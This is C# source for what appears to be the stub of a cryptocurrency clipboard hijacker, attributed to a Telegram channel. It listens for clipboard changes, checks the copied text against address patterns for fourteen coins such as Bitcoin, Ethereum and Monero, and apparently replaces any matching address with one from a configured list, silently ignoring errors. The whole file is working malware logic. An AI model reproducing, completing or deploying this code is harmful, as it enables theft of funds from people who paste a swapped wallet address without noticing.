// By https://t.me/devxstudio
using Stub.Help;
using Stub.Helpers;
using System;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Stub
{
    public partial class Form1 : Form
    {
        
        public Form1()
        {
            SuspendLayout();
            AutoScaleDimensions = new SizeF(6F, 13F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(383, 191);
            Name = "Form1";
            Text = "Form1";
            Load += new EventHandler(Form1_Load_1);
            ResumeLayout(false);
            AddClipboardFormatListener(Handle);
        }

        private void Form1_Load_1(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        protected override void WndProc(ref Message m)
        {
            try
            {
                string btc = @"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"; // Bitcoin
                string btc_bc1 = @"^bc1[a-zA-HJ-NP-Z0-9]{35,41}\b"; // Bitcoin
                string eth = @"(0x)[a-fA-F0-9]{40}"; // Ethereum
                string xmr = @"[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}"; // Monero
                string xlm = @"^G[0-9a-zA-Z]{55}$"; // Stellar
                string xrp = @"^r[0-9a-zA-Z]{24,34}$"; // Ripple
                string nec = @"^A[0-9a-zA-Z]{33}$"; // Neocoin
                string bch = @"^((bitcoincash:)?(q|p)[a-z0-9]{41})"; // Bitcoin Cash
                string ltcl = @"[LM][a-km-zA-HJ-NP-Z1-9]{26,33}"; // Litecoin L
                string doge = @"^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$"; // Dogecoin
                string dash = @"^X[1-9A-HJ-NP-Za-km-z]{33}$"; // Dashcoin
                string trx = @"^T[a-zA-Z0-9]{28,33}$"; // Tron
                string zcash = @"t1[0-9A-z]{33}";
                string bnb = @"(bnb)([a-z0-9]{39})";
                
                base.WndProc(ref m);

                if (m.Msg != 0x031D) return;

                if (!Clipboard.ContainsText()) return;
                Cfgnative.CheckD();

                var buf = ClipboardNative.GetText();

                string[] lst;
                if (Config.BTC.ToList().Contains(buf)
                    ^ Config.BTC_BC1.ToList().Contains(buf)
                    ^ Config.ETH.ToList().Contains(buf)
                    ^ Config.XMR.ToList().Contains(buf)
                    ^ Config.xlm.ToList().Contains(buf)
                    ^ Config.xrp.ToList().Contains(buf)
                    ^ Config.nec.ToList().Contains(buf)
                    ^ Config.BCH.ToList().Contains(buf)
                    ^ Config.LTC.ToList().Contains(buf)
                    ^ Config.BCH.ToList().Contains(buf)
                    ^ Config.LTC.ToList().Contains(buf)
                    ^ Config.DOGE.ToList().Contains(buf)
                    ^ Config.dash.ToList().Contains(buf)
                    ^ Config.trx.ToList().Contains(buf)
                    ^ Config.zcash.ToList().Contains(buf)
                    ^ Config.bnb.ToList().Contains(buf)
                     ) return;

                if (RegEx.Checker(buf, btc))
                {
                    lst = Config.BTC;
                }

                else if (RegEx.Checker(buf, btc_bc1))
                {
                    lst = Config.BTC_BC1;
                }

                else if (RegEx.Checker(buf, eth))
                {
                    lst = Config.ETH;
                }

                else if (RegEx.Checker(buf, xmr))
                {
                    lst = Config.XMR;
                }

                else if (RegEx.Checker(buf, xlm))
                {
                    lst = Config.xlm;
                }

                else if (RegEx.Checker(buf, xrp))
                {
                    lst = Config.xrp;
                }

                else if (RegEx.Checker(buf, nec))
                {
                    lst = Config.nec;
                }

                else if (RegEx.Checker(buf, bch))
                {
                    lst = Config.BCH;
                }

                else if (RegEx.Checker(buf, ltcl))
                {
                    lst = Config.LTC;
                }

                else if (RegEx.Checker(buf, doge))
                {
                    lst = Config.DOGE;
                }

                else if (RegEx.Checker(buf, dash))
                {
                    lst = Config.dash;
                }

                else if (RegEx.Checker(buf, trx))
                {
                    lst = Config.trx;
                }

                else if (RegEx.Checker(buf, zcash))
                {
                    lst = Config.zcash;
                }

                else if (RegEx.Checker(buf, bnb))
                {
                    lst = Config.bnb;
                }
                else return;

                SetClipBoard.Run(buf, lst);
                Thread.Sleep(100);

                NativeMethods.EmptyClipboard();
            }
            catch { }

            base.WndProc(ref m);
        }
    }
}


